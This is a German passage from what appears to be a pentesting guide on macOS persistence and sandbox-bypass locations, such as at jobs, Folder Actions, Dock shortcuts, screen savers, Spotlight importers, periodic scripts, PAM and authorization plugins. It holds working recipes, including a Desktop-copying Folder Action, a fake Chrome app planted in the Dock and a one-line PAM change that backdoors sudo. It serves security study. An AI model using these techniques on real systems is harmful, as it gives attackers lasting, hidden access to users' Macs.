Wenn Sie eine **ZIP**-Datei als **Anmeldeelement** speichern, wird das **`Archivierungsprogramm`** es öffnen, und wenn die ZIP beispielsweise in **`~/Library`** gespeichert wurde und den Ordner **`LaunchAgents/file.plist`** mit einem Backdoor enthielt, wird dieser Ordner erstellt (ist standardmäßig nicht vorhanden) und die plist wird hinzugefügt, sodass beim nächsten Anmelden des Benutzers die **Backdoor, die in der plist angegeben ist, ausgeführt wird**.

Eine weitere Möglichkeit wäre, die Dateien **`.bash_profile`** und **`.zshenv`** im Benutzer-Home zu erstellen, sodass diese Technik weiterhin funktioniert, wenn der Ordner LaunchAgents bereits existiert.

### At

Schriftliche Zusammenfassung: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- Aber Sie müssen **`at`** **ausführen** und es muss **aktiviert** sein
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Standort

- Muss **`at`** **ausführen** und es muss **aktiviert** sein

#### **Beschreibung**

`at`-Aufgaben sind dafür ausgelegt, **einmalige Aufgaben** zu bestimmten Zeiten auszuführen. Im Gegensatz zu Cron-Jobs werden `at`-Aufgaben nach der Ausführung automatisch entfernt. Es ist wichtig zu beachten, dass diese Aufgaben über Systemneustarts hinweg persistent sind, was sie unter bestimmten Bedingungen zu potenziellen Sicherheitsbedenken macht.

Standardmäßig sind sie **deaktiviert**, aber der **Root**-Benutzer kann **sie** mit **aktivieren**:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Dies wird in 1 Stunde eine Datei erstellen:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Überprüfen Sie die Job-Warteschlange mit `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Darüber sehen wir zwei geplante Jobs. Wir können die Details des Jobs mit `at -c JOBNUMBER` ausdrucken.
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> Wenn AT-Aufgaben nicht aktiviert sind, werden die erstellten Aufgaben nicht ausgeführt.

Die **Jobdateien** befinden sich unter `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Der Dateiname enthält die Warteschlange, die Jobnummer und die Zeit, zu der er ausgeführt werden soll. Zum Beispiel betrachten wir `a0001a019bdcd2`.

- `a` - dies ist die Warteschlange
- `0001a` - Jobnummer in Hex, `0x1a = 26`
- `019bdcd2` - Zeit in Hex. Es repräsentiert die seit der Epoche vergangene Minuten. `0x019bdcd2` ist `26991826` in Dezimal. Wenn wir es mit 60 multiplizieren, erhalten wir `1619509560`, was `GMT: 27. April 2021, Dienstag 7:46:00` ist.

Wenn wir die Jobdatei drucken, stellen wir fest, dass sie die gleichen Informationen enthält, die wir mit `at -c` erhalten haben.

### Ordneraktionen

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- Aber Sie müssen in der Lage sein, `osascript` mit Argumenten aufzurufen, um **`System Events`** zu kontaktieren, um Ordneraktionen konfigurieren zu können
- TCC-Umgehung: [🟠](https://emojipedia.org/large-orange-circle)
- Es hat einige grundlegende TCC-Berechtigungen wie Desktop, Dokumente und Downloads

#### Standort

- **`/Library/Scripts/Folder Action Scripts`**
- Root erforderlich
- **Trigger**: Zugriff auf den angegebenen Ordner
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: Zugriff auf den angegebenen Ordner

#### Beschreibung & Ausnutzung

Ordneraktionen sind Skripte, die automatisch durch Änderungen in einem Ordner ausgelöst werden, wie das Hinzufügen, Entfernen von Elementen oder andere Aktionen wie das Öffnen oder Ändern der Größe des Ordnerfensters. Diese Aktionen können für verschiedene Aufgaben genutzt werden und können auf unterschiedliche Weise ausgelöst werden, z. B. durch die Finder-Benutzeroberfläche oder Terminalbefehle.

Um Ordneraktionen einzurichten, haben Sie Optionen wie:

1. Erstellen eines Ordneraktions-Workflows mit [Automator](https://support.apple.com/guide/automator/welcome/mac) und Installieren als Dienst.
2. Manuelles Anhängen eines Skripts über die Ordneraktionskonfiguration im Kontextmenü eines Ordners.
3. Verwendung von OSAScript, um Apple Event-Nachrichten an die `System Events.app` zu senden, um programmgesteuert eine Ordneraktion einzurichten.
- Diese Methode ist besonders nützlich, um die Aktion im System einzubetten und ein gewisses Maß an Persistenz zu bieten.

Das folgende Skript ist ein Beispiel dafür, was von einer Ordneraktion ausgeführt werden kann:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Um das obige Skript für Ordneraktionen verwendbar zu machen, kompilieren Sie es mit:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Nachdem das Skript kompiliert ist, richten Sie Ordneraktionen ein, indem Sie das folgende Skript ausführen. Dieses Skript aktiviert die Ordneraktionen global und fügt das zuvor kompilierte Skript speziell zum Desktop-Ordner hinzu.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Führen Sie das Setup-Skript mit aus:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Dies ist der Weg, um diese Persistenz über die GUI zu implementieren:

Dies ist das Skript, das ausgeführt wird:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Kompiliere es mit: `osacompile -l JavaScript -o folder.scpt source.js`

Bewege es nach:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Dann öffnen Sie die App `Folder Actions Setup`, wählen Sie den **Ordner, den Sie überwachen möchten** und wählen Sie in Ihrem Fall **`folder.scpt`** (in meinem Fall habe ich es output2.scp genannt):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Jetzt, wenn Sie diesen Ordner mit **Finder** öffnen, wird Ihr Skript ausgeführt.

Diese Konfiguration wurde im **plist** gespeichert, das sich in **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** im base64-Format befindet.

Jetzt versuchen wir, diese Persistenz ohne GUI-Zugriff vorzubereiten:

1. **Kopieren Sie `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** nach `/tmp`, um es zu sichern:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Entfernen** Sie die gerade festgelegten Folder Actions:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Jetzt, da wir eine leere Umgebung haben

3. Kopieren Sie die Sicherungsdatei: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Öffnen Sie die Folder Actions Setup.app, um diese Konfiguration zu verwenden: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Und das hat bei mir nicht funktioniert, aber das sind die Anweisungen aus dem Bericht:(

### Dock-Shortcuts

Bericht: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- Aber Sie müssen eine bösartige Anwendung im System installiert haben
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Standort

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: Wenn der Benutzer auf die App im Dock klickt

#### Beschreibung & Ausnutzung

Alle Anwendungen, die im Dock erscheinen, sind im plist angegeben: **`~/Library/Preferences/com.apple.dock.plist`**

Es ist möglich, **eine Anwendung hinzuzufügen** nur mit:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Durch **Social Engineering** könnten Sie beispielsweise **Google Chrome** im Dock nachahmen und tatsächlich Ihr eigenes Skript ausführen:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Farbwähler

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
- Eine sehr spezifische Aktion muss stattfinden
- Sie werden in einer anderen Sandbox enden
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Standort

- `/Library/ColorPickers`
- Root erforderlich
- Auslöser: Verwenden Sie den Farbwähler
- `~/Library/ColorPickers`
- Auslöser: Verwenden Sie den Farbwähler

#### Beschreibung & Exploit

**Kompilieren Sie ein Farbwähler**-Bundle mit Ihrem Code (Sie könnten [**dieses Beispiel verwenden**](https://github.com/viktorstrate/color-picker-plus)) und fügen Sie einen Konstruktor hinzu (wie im [Bildschirmschoner-Bereich](macos-auto-start-locations.md#screen-saver)) und kopieren Sie das Bundle nach `~/Library/ColorPickers`.

Dann, wenn der Farbwähler ausgelöst wird, sollte Ihr Code ebenfalls ausgeführt werden.

Beachten Sie, dass die Binärdatei, die Ihre Bibliothek lädt, eine **sehr restriktive Sandbox** hat: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Nützlich, um Sandbox zu umgehen: **Nein, weil Sie Ihre eigene App ausführen müssen**
- TCC-Umgehung: ???

#### Standort

- Eine spezifische App

#### Beschreibung & Exploit

Ein Anwendungsbeispiel mit einer Finder Sync Erweiterung [**kann hier gefunden werden**](https://github.com/D00MFist/InSync).

Anwendungen können `Finder Sync Extensions` haben. Diese Erweiterung wird in eine Anwendung integriert, die ausgeführt wird. Darüber hinaus muss die Erweiterung, um ihren Code ausführen zu können, **mit einem gültigen Apple-Entwicklerzertifikat signiert** sein, sie muss **sandboxed** sein (obwohl entspannte Ausnahmen hinzugefügt werden könnten) und sie muss mit etwas wie registriert sein:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Bildschirmschoner

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
- Aber Sie landen in einer gemeinsamen Anwendungs-Sandbox
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Standort

- `/System/Library/Screen Savers`
- Root erforderlich
- **Trigger**: Wählen Sie den Bildschirmschoner aus
- `/Library/Screen Savers`
- Root erforderlich
- **Trigger**: Wählen Sie den Bildschirmschoner aus
- `~/Library/Screen Savers`
- **Trigger**: Wählen Sie den Bildschirmschoner aus

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Beschreibung & Exploit

Erstellen Sie ein neues Projekt in Xcode und wählen Sie die Vorlage aus, um einen neuen **Bildschirmschoner** zu generieren. Fügen Sie dann Ihren Code hinzu, zum Beispiel den folgenden Code, um Protokolle zu generieren.

**Bauen** Sie es und kopieren Sie das `.saver`-Bundle in **`~/Library/Screen Savers`**. Öffnen Sie dann die GUI für den Bildschirmschoner und wenn Sie einfach darauf klicken, sollte es viele Protokolle generieren:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Beachten Sie, dass Sie sich aufgrund der Berechtigungen des Binärprogramms, das diesen Code lädt (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`), **`com.apple.security.app-sandbox`** befinden werden, **innerhalb des gemeinsamen Anwendungs-Sandboxes**.

Saver code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight-Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
- Aber Sie werden in einer Anwendungssandbox enden
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)
- Die Sandbox sieht sehr eingeschränkt aus

#### Standort

- `~/Library/Spotlight/`
- **Trigger**: Eine neue Datei mit einer von dem Spotlight-Plugin verwalteten Erweiterung wird erstellt.
- `/Library/Spotlight/`
- **Trigger**: Eine neue Datei mit einer von dem Spotlight-Plugin verwalteten Erweiterung wird erstellt.
- Root erforderlich
- `/System/Library/Spotlight/`
- **Trigger**: Eine neue Datei mit einer von dem Spotlight-Plugin verwalteten Erweiterung wird erstellt.
- Root erforderlich
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: Eine neue Datei mit einer von dem Spotlight-Plugin verwalteten Erweiterung wird erstellt.
- Neue App erforderlich

#### Beschreibung & Ausnutzung

Spotlight ist die integrierte Suchfunktion von macOS, die entwickelt wurde, um Benutzern **schnellen und umfassenden Zugriff auf Daten auf ihren Computern** zu bieten.\
Um diese schnelle Suchfunktion zu ermöglichen, verwaltet Spotlight eine **proprietäre Datenbank** und erstellt ein Index, indem es **die meisten Dateien analysiert**, was schnelle Suchen sowohl durch Dateinamen als auch durch deren Inhalt ermöglicht.

Der zugrunde liegende Mechanismus von Spotlight umfasst einen zentralen Prozess namens 'mds', was für **'Metadatenserver'** steht. Dieser Prozess orchestriert den gesamten Spotlight-Dienst. Ergänzend dazu gibt es mehrere 'mdworker'-Dämonen, die eine Vielzahl von Wartungsaufgaben durchführen, wie das Indizieren verschiedener Dateitypen (`ps -ef | grep mdworker`). Diese Aufgaben werden durch Spotlight-Importer-Plugins oder **".mdimporter-Bundles"** ermöglicht, die Spotlight in die Lage versetzen, Inhalte in einer Vielzahl von Dateiformaten zu verstehen und zu indizieren.

Die Plugins oder **`.mdimporter`**-Bundles befinden sich an den zuvor genannten Orten, und wenn ein neues Bundle erscheint, wird es innerhalb von Minuten geladen (es ist kein Neustart eines Dienstes erforderlich). Diese Bundles müssen angeben, welche **Dateitypen und Erweiterungen sie verwalten können**, damit Spotlight sie verwendet, wenn eine neue Datei mit der angegebenen Erweiterung erstellt wird.

Es ist möglich, **alle `mdimporters`** zu finden, die geladen sind, indem man Folgendes ausführt:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Und zum Beispiel **/Library/Spotlight/iBooksAuthor.mdimporter** wird verwendet, um diese Art von Dateien (Erweiterungen `.iba` und `.book` unter anderem) zu parsen:
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Wenn Sie die Plist anderer `mdimporter` überprüfen, finden Sie möglicherweise nicht den Eintrag **`UTTypeConformsTo`**. Das liegt daran, dass dies ein integrierter _Uniform Type Identifier_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) ist und keine Erweiterungen angegeben werden müssen.
>
> Darüber hinaus haben die Standard-Plugins des Systems immer Vorrang, sodass ein Angreifer nur auf Dateien zugreifen kann, die nicht anderweitig von Apples eigenen `mdimporters` indiziert werden.

Um Ihren eigenen Importer zu erstellen, könnten Sie mit diesem Projekt beginnen: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) und dann den Namen, die **`CFBundleDocumentTypes`** ändern und **`UTImportedTypeDeclarations`** hinzufügen, damit es die Erweiterung unterstützt, die Sie unterstützen möchten, und sie in **`schema.xml`** reflektieren.\
Ändern Sie dann den Code der Funktion **`GetMetadataForFile`**, um Ihre Payload auszuführen, wenn eine Datei mit der verarbeiteten Erweiterung erstellt wird.

Schließlich **bauen und kopieren Sie Ihren neuen `.mdimporter`** an einen der vorherigen Standorte, und Sie können überprüfen, ob er geladen wird, indem Sie **die Protokolle überwachen** oder **`mdimport -L.`** überprüfen.

### ~~Einstellungsfenster~~

> [!CAUTION]
> Es sieht nicht so aus, als würde dies noch funktionieren.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
- Es benötigt eine spezifische Benutzeraktion
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Standort

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Beschreibung

Es sieht nicht so aus, als würde dies noch funktionieren.

## Root Sandbox Umgehung

> [!TIP]
> Hier finden Sie Startorte, die nützlich sind für **Sandbox-Umgehungen**, die es Ihnen ermöglichen, einfach etwas auszuführen, indem Sie es **in eine Datei schreiben**, während Sie **root** sind und/oder andere **seltsame Bedingungen** erfordern.

### Periodisch

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
- Aber Sie müssen root sein
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Standort

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Root erforderlich
- **Auslöser**: Wenn die Zeit gekommen ist
- `/etc/daily.local`, `/etc/weekly.local` oder `/etc/monthly.local`
- Root erforderlich
- **Auslöser**: Wenn die Zeit gekommen ist

#### Beschreibung & Ausnutzung

Die periodischen Skripte (**`/etc/periodic`**) werden aufgrund der **Launch-Daemons** ausgeführt, die in `/System/Library/LaunchDaemons/com.apple.periodic*` konfiguriert sind. Beachten Sie, dass Skripte, die in `/etc/periodic/` gespeichert sind, **als der Eigentümer der Datei ausgeführt werden**, sodass dies nicht für eine potenzielle Privilegieneskalation funktioniert.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Es gibt andere periodische Skripte, die in **`/etc/defaults/periodic.conf`** ausgeführt werden:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Wenn Sie eine der Dateien `/etc/daily.local`, `/etc/weekly.local` oder `/etc/monthly.local` schreiben, wird sie **so oder so ausgeführt**.

> [!WARNING]
> Beachten Sie, dass das periodische Skript **als Eigentümer des Skripts ausgeführt wird**. Wenn also ein regulärer Benutzer das Skript besitzt, wird es als dieser Benutzer ausgeführt (dies könnte Privilegieneskalationsangriffe verhindern).

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
- Aber Sie müssen root sein
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Standort

- Root immer erforderlich

#### Beschreibung & Ausnutzung

Da sich PAM mehr auf **Persistenz** und Malware konzentriert als auf die einfache Ausführung innerhalb von macOS, wird dieser Blog keine detaillierte Erklärung geben, **lesen Sie die Writeups, um diese Technik besser zu verstehen**.

Überprüfen Sie die PAM-Module mit:
```bash
ls -l /etc/pam.d
```
Eine Persistenz-/Rechteausweitungstechnik, die PAM ausnutzt, ist so einfach wie das Modifizieren des Moduls /etc/pam.d/sudo, indem man am Anfang die Zeile hinzufügt:
```bash
auth       sufficient     pam_permit.so
```
Es wird **aussehen wie** etwas wie dies:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Und daher wird jeder Versuch, **`sudo` zu verwenden**, funktionieren.

> [!CAUTION]
> Beachten Sie, dass dieses Verzeichnis durch TCC geschützt ist, sodass es sehr wahrscheinlich ist, dass der Benutzer eine Aufforderung zur Zugriffsanfrage erhält.

Ein weiteres schönes Beispiel ist su, wo Sie sehen können, dass es auch möglich ist, Parameter an die PAM-Module zu übergeben (und Sie könnten auch diese Datei mit einem Backdoor versehen):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Autorisierungs-Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
- Aber du musst root sein und zusätzliche Konfigurationen vornehmen
- TCC-Umgehung: ???

#### Standort

- `/Library/Security/SecurityAgentPlugins/`
- Root erforderlich
- Es ist auch notwendig, die Autorisierungsdatenbank zu konfigurieren, um das Plugin zu verwenden

#### Beschreibung & Ausnutzung

Du kannst ein Autorisierungs-Plugin erstellen, das ausgeführt wird, wenn sich ein Benutzer anmeldet, um Persistenz aufrechtzuerhalten. Für weitere Informationen darüber, wie man eines dieser Plugins erstellt, siehe die vorherigen Writeups (und sei vorsichtig, ein schlecht geschriebenes kann dich aussperren und du musst deinen Mac im Wiederherstellungsmodus bereinigen).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
